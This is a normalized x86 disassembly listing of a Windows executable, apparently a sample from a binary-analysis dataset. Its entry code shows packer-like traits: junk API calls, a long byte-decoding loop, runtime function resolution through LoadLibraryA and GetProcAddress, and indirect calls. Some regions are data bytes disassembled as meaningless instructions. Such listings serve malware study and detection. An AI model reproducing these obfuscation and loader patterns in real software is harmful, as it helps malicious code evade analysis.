nop
mov eax 0x1f3244f2
call sub_4026cc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
call GetNearestColor
mov [ rw-data ] 0x1
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
inc eax
mov ecx 0x83
xor edx edx
div ecx
mov eax [ rw-data ]
add eax [ rw-data ]
mov [ eax ] dl
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1f3225d9
jne r-xdata
nop
mov eax [ rw-data ]
call sub_4026ec
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov [ rw-data ] 0x1
push 0x0
push 0x0
call GetNearestColor
inc [ rw-data ]
cmp [ rw-data ] 0x8bcd
jne r-xdata
nop
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
nop
nop
push 0x19
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_48c824
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x14
jbe r-xdata
nop
nop
push 0x0
call sub_48c894
nop
jmp r-xdata
sub_49238f
pop edx
push 0x6a
jl r-xdata
sbb al 0xd0
jl r-xdata
push 0x6a
add eax 0x959491fd
xchg ebp eax
sbb [ eax ] dl
leave
push 0x7cc56a6a
imul ecx [ ebp + 0x6a ] 0x6a
add eax 0xad16f305
xchg ebp eax
jl r-xdata
xchg ecx eax
xchg esp eax
xchg ebp eax
and [ edx + 0x6a ] ch
add eax 0x26a0505
adc [ ebp - 0x7c836a6b ] edx
inc ecx
push 0x6a
push ss
push ecx
test [ esi ] ebx
dec ebp
jl r-xdata
lea edi [ ecx + edx * 8 + 0x5b ]
push 0x6a
imul ebp [ edx + 0x6a ] 0x5
add eax 0xa6050505
push ebp
pop esp
push esi
add eax 0x6a7fda7c
push 0x5
add eax 0x5050505
add eax 0x6a3c8b7c
push 0x5
add eax 0x119a0505
and esp [ ecx + 0x6a ]
push 0x7c
adc eax 0x56a6a47
add eax 0x1ec50505
rcr [ ebp - 0x75026a01 ] 0x1
xchg ebp eax
0x68c77c95 0x6a6a
add eax 0xc7cc505
dec ebx
push 0x6a
add eax 0x5050505
add eax 0x7c8d5116
rcr [ ebx + 0x6a ] 0x1
push 0xffffffc6
push 0xffffffe0
jne r-xdata
push 0x6a
add eax 0x5050505
cmpsb [ esi ] [ edi ]
push 0x6a
push 0x5
add eax 0x5050505
add eax 0xf3975716
adc [ edx + ebx * 4 + 0x10 ] bl
dec [ ebx + 0x3cb8fc55 ]
daa
dec ecx
add al ch
sbb eax 0x85fff7a2
ror [ edi ] 0x85
je r-xdata
cdq
inc ebx
push 0x6a
add eax 0x1cf34b1e
enter 0x1e6f 0x4d
sbb al 0xc8
imul esp [ esi - 0x37e30cb2 ] 0x39967c6b
push 0x6a
mov esp ebp
pop ebp
retn 0x4
push 0x0
push 0x0
call GetNearestColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
add [ eax ] al
mov [ rw-data ] 0x368e
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
push 0x0
push 0x0
call GetNearestColor
jmp r-xdata
mov [ rw-data ] 0x7fcb
nop
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492730
lea eax [ ebp - 0x4 ]
call sub_404038
retn
nop
nop
push 0x0
push 0x0
call GetNearestColor
nop
inc [ rw-data ]
cmp [ rw-data ] 0x168a
jne r-xdata
push 0x0
push 0x0
call GetNearestColor
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x201e
nop
push 0x0
push 0x0
call GetNearestColor
push 0x0
push 0x0
call GetNearestColor
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
push 0x0
call GetNearestColor
inc [ rw-data ]
cmp [ rw-data ] 0x887d
jne r-xdata
nop
push 0x0
push 0x0
call GetNearestColor
nop
nop
nop
nop
mov eax 0x1f3244f2
call sub_4026cc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
call GetNearestColor
mov [ rw-data ] 0x1
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
inc eax
mov ecx 0x83
xor edx edx
div ecx
mov eax [ rw-data ]
add eax [ rw-data ]
mov [ eax ] dl
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1f3225d9
jne r-xdata
nop
mov eax [ rw-data ]
call sub_4026ec
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov [ rw-data ] 0x1
push 0x0
push 0x0
call GetNearestColor
inc [ rw-data ]
cmp [ rw-data ] 0x8bcd
jne r-xdata
nop
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
nop
nop
push 0x19
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_48c824
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x14
jbe r-xdata
nop
nop
push 0x0
call sub_48c894
nop
jmp r-xdata
sub_492430
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a3c#6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49245c
retn
sub_4927b3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_403a3c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4927da
retn
sub_4927dc
inc edi
add [ eax ] al
add ah ah
daa
dec ecx
add [ ecx ] ah
inc eax
add ah dh
pushad
inc eax
add [ eax ] bl
pop edi
inc eax
add ah al
pop esi
inc eax
add [ ecx + 0x616c0040 ] bl
inc eax
add [ eax + 0x6f ] al
inc eax
add [ eax ] dl
outsd
inc eax
add [ eax + 0x6f ] bh
inc eax
add [ eax + 0x6f ] cl
inc eax
add al dh
pop eax
inc ecx
add al al
pop eax
inc ecx
add [ eax + 0x60004072 ] dl
jb r-xdata
add al bl
fiadd [ edx ]
cwde
fiadd [ edx ]
mov al [ 0x700042ce ]
into
add [ eax + 0x100040da ] dl
fld [ eax ]
cld
loop r-xdata
sbb ah ah
inc edx
add al ch
jecxz r-xdata
inc edx
add [ eax + 0x26 ] cl
inc edx
add [ eax - 0x3bffbd43 ] bl
mov esp 0xb7fc0042
inc ebp
add ah cl
mov bh 0x45
add al ah
into
inc edx
add [ eax - 0x47ffbd32 ] dh
sbb eax 0x1d480046
inc esi
add [ eax ] bl
in al 0x42
inc edx
add [ eax - 0x32 ] dh
add ah cl
loop r-xdata
fild [ edx ]
loopne r-xdata
add al al
in eax dx
inc edx
add [ ebp + ebp * 8 + 0x42 ] ch
add [ ebx + edi * 8 ] cl
inc edx
add ah bl
cli
inc edx
add ah dl
cli
inc edx
add [ edx + edi * 8 - 0x563ffbe ] ah
inc edx
add [ edx + edi * 8 + 0x42 ] ch
add [ edx + edi * 8 + 0x42 ] ah
add [ edx + edi * 8 ] dh
add [ eax ] ah
mov [ edx ] sub_42c6f0
js r-xdata
add [ ecx + ecx * 2 ] bl
inc ecx
add [ eax + ecx * 2 + 0x4ae80041 ] ah
inc ecx
add [ eax - 0x67ffbeb6 ] bh
pop eax
inc ecx
add [ eax + 0x58 ] cl
inc ecx
add [ edx ] dh
inc edx
add [ ecx - 0x412bffbe ] al
inc edx
add [ esi + edi * 4 - 0x3bbfffbe ] ah
inc edx
add [ eax ] dl
les eax [ edx ]
fcomp st6
inc edx
add [ eax - 0x5fffbd22 ] bl
into
inc edx
inc edx
add [ ebx + edi * 8 - 0x483ffbe ] ch
inc edx
add [ ebp * 4 - 0x5313ffbd ] bl
inc ebx
add [ edi + ebx * 2 + 0x44 ] cl
add [ edi + ebx * 2 ] bl
inc esp
add [ eax ] dl
xor al 0xfa
inc edx
add [ edi + ebx * 8 + 0x42 ] dl
add [ eax ] bl
fild [ edx ]
in al dx
sti
inc edx
add [ ebx + edi * 8 - 0x3dbffbe ] bh
inc edx
add ah dh
sti
inc edx
add [ eax + 0x1f ] bl
inc ebx
add ah bh
push ds
inc ebx
add al dh
push ebx
inc ebx
add [ eax + 0x2c004353 ] ch
cli
inc edx
add ah bh
stc
inc edx
add [ esi + ebp * 8 ] cl
inc edx
add ah bl
in eax dx
inc edx
add [ edi + ecx * 4 - 0x709bffbd ] ch
inc ebx
add [ eax + edx * 4 ] dl
inc ebx
add ah cl
pop [ ebx ]
inc eax
add [ ebx ] 0x8
add [ ebx ] 0x44
pop [ ebx ]
adc al 0x8f
inc ebx
add [ ebx + ebx * 2 ] ch
inc ebx
add ah bh
pop edx
inc ebx
add [ edx + ebx * 2 + 0x5a680043 ] ah
inc ebx
add [ eax + 0x70004462 ] ah
bound eax [ eax + eax - 0x80 ]
nop
inc ebx
add [ eax ] dh
nop
inc ebx
add al bl
nop
inc ebx
add [ eax + 0x58004390 ] cl
push esp
inc ebx
add [ eax ] ch
push esp
inc ebx
add [ eax ] bl
rol [ ebx ] cl
mov al [ 0x400043d1 ]
fiadd [ ebx ]
cld
fld [ ebx ]
xor [ ecx - 0x7f37ffbb ] al
inc ebp
add ah dl
fwait
inc ebp
add [ ebx + ebx * 4 + 0x6f6c0045 ] ah
inc esp
add ah dh
outsb
inc esp
add [ edx + 0x42 ] ch
add [ edx ] bh
inc edx
add [ eax + 0x440046e4 ] ah
in al 0x46
add [ eax ] bh
inc esi
add [ eax ] cl
inc esi
add [ eax + 0x70004700 ] ah
add [ edi ] al
cmp bl 0x46
add [ eax - 0x5 ] dl
inc esi
add al al
sti
inc esi
add [ eax + 0x400046fb ] dl
cwde
inc edi
add [ eax ] dl
cwde
inc edi
add [ eax + 0x47 ] al
dec eax
add al dh
inc esi
dec eax
add al cl
and [ edi ] al
cwde
and [ edi ] al
mov eax 0x8800487c
jl r-xdata
call sub_46cf44
mov ecx [ rw-data ]
mov eax [ rw-data ]
add [ eax ] cl
jg r-xdata
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46cf5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cfdc
call sub_403f48
dec [ ebx + 0x4944ec0d ]
add ah al
jle r-xdata
add [ ecx + rw-data ] ah
inc esp
dec ecx
add [ eax + 0x60004891 ] dl
xchg ecx eax
dec eax
add al ch
fwait
dec eax
add [ eax - 0x7fffb765 ] bh
lds ecx [ eax ]
push eax
lds ecx [ eax ]
pushad
and al 0x49
add [ eax ] dh
and al 0x49
add [ eax ] al
add [ eax ] al
add [ edi - 0x74aaffb7 ] dh
in al dx
add esp 0xfffffff0
mov eax sub_4927dc
call sub_4060b0
mov eax [ rw-data ]
mov eax [ eax ]
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_4927dc
call sub_4060b0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf44
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46cf5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cfdc
call sub_403f48
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405a08
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405a1c
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40124c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_403a3c
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_403a3c
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_403a3c
sub_40241a
jmp sub_403a3c
sub_4026b9
jmp sub_403a3c
sub_40277c
call sub_406064
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406064
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_404020
sub_402834
push eax
push edx
push ecx
call sub_406064
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_406064
mov ebx [ eax + 0x4 ]
call sub_406064
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a60
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a70
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b0c
mov edx [ eax + 0x1c ]
call sub_402ac4
retn
sub_402b9f
retn
sub_402ba0
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028c8
retn
sub_402db0
mov ecx 0xff
call sub_402dbc
retn
sub_402de0
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402dfc
jmp sub_402dfc
sub_402df9
retn
sub_403189
jmp sub_403a3c
sub_4031dc
fninit
fwait
fldcw [ rw-data ]
retn
sub_403234
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403240
push ebx
mov ebx eax
mov eax ebx
call sub_403270
call sub_4026cc
mov edx eax
mov eax ebx
call sub_4032b4
pop ebx
retn
sub_40325c
push ebx
mov ebx eax
mov eax ebx
call sub_40330c
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_403270
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403298
call sub_403674
test dl dl
jle r-xdata
retn
call sub_40365c
sub_403358
retn
sub_4033e0
jmp sub_403a3c
sub_4033e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034f0
mov eax 0x8000ffff
retn
sub_4034f8
retn
sub_4034fc
retn
sub_403500
retn
sub_403635
jmp sub_403788
sub_40363a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a9c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40365c
sub_40365c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403664
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403674
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403684
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40374c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403768
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b35
retn
sub_403c78
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403d06
jmp sub_403788
sub_403d66
jmp sub_403788
sub_403d80
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c78
mov [ rw-data ] 0x0
call sub_403d20
retn
sub_403eb9
retn
sub_40401b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404020
mov [ rw-data ] eax
call sub_403f48
sub_40425c
retn
sub_404298
retn
sub_4042a6
retn
sub_4042bf
retn
sub_4042d0
retn
sub_4043b7
retn
sub_4044e8
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404504
jmp sub_404504
sub_40454d
retn
sub_404555
retn
sub_404597
retn
sub_40471c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_404734
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_40488c
retn
sub_40489e
retn
sub_4048a0
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404a94
mov ecx 0x1
jmp sub_404a00
sub_404a9e
retn
sub_404ad4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404bd8
mov ecx 0x1
jmp sub_404aec
sub_404be2
retn
sub_404be4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404e0a
retn
sub_404e0c
push edx
call sub_4026cc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404a94
pop eax
sub_404e20
push eax
call sub_404bd8
pop eax
call sub_4026ec
retn
sub_404e30
mov al 0x11
jmp sub_402828
sub_404e5b
retn
sub_40509c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404d18
pop ebp
retn 0x4
j_sub_404aec
jmp sub_404aec
sub_4050b1
retn
sub_4050b4
call sub_405254
retn
sub_4052e0
call sub_4052b8
retn
sub_405629
jmp sub_403a3c
sub_405794
call sub_40579c
retn
sub_4057c8
call sub_4057d8
retn
sub_4057d0
call sub_4057f8
retn
sub_4057d8
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405893
jmp sub_403788
sub_4058b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405928
jmp sub_403a3c
sub_40592f
pop ecx
pop ebp
retn
sub_4059a8
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4059b4
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4059c0
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_4059d0
call sub_403240
mov [ eax + 0x4 ] 0x1
retn
sub_405a08
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405cf7
jmp sub_403a3c
sub_405cfe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d9b
jmp sub_403a3c
sub_405da2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405deb
jmp sub_403a3c
sub_405df2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405eb6
jmp sub_403a3c
sub_405ebd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405f0e
jmp sub_403a3c
sub_405f15
pop ebp
retn
sub_405fec
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_40600c
push eax
push 0x40
call LocalAlloc
retn
sub_406018
mov eax 0x40
retn
sub_4060a4
mov eax rw-data
call sub_4058b4
retn
sub_406119
jmp sub_403a3c
sub_406120
pop ebp
retn
sub_406124
sub [ rw-data ] 0x1
retn
sub_40612c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_406148
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406191
jmp sub_403a3c
sub_406198
pop ebp
retn
sub_40619c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406478
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GdiFlush
jmp [ GdiFlush@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextExtentPointA
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPointA) ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polygon
jmp [ __import_lookup_table_8(gdi32:Polygon) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
ScaleWindowExtEx
jmp [ ScaleWindowExtEx@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ __import_lookup_table_8(gdi32:SetViewportOrgEx) ]
UnrealizeObject
